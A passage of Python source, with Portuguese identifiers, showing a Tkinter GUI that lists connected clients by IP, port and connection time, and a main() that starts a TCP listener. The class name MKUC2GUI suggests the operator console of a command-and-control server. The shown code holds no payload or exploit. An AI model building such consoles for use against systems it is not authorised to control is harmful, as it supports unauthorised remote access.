                    tempo_conectado = time.time() - info['timestamp']
                    minutos = int(tempo_conectado // 60)
                    segundos = int(tempo_conectado % 60)
                    self.client_tree.insert("", "end", values=(
                        id_cliente,
                        info['addr'][0],
                        info['addr'][1],
                        f"{minutos}m {segundos}s"
                    ))
        except Exception as e:
            self.log(f"[!] Erro ao atualizar GUI: {e}", cor="#ff3333")
        self.root.after(1000, self.atualizar_gui)

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as servidor:
        servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        servidor.bind((IP, PORTA))
        servidor.listen(5)
        threading.Thread(target=aceitar_conexoes, args=(servidor,), daemon=True).start()
        root = tk.Tk()
        app = MKUC2GUI(root)
        app.log(f"[*] Iniciando listener na porta {PORTA}")
        root.mainloop()

if __name__ == '__main__':
    main()
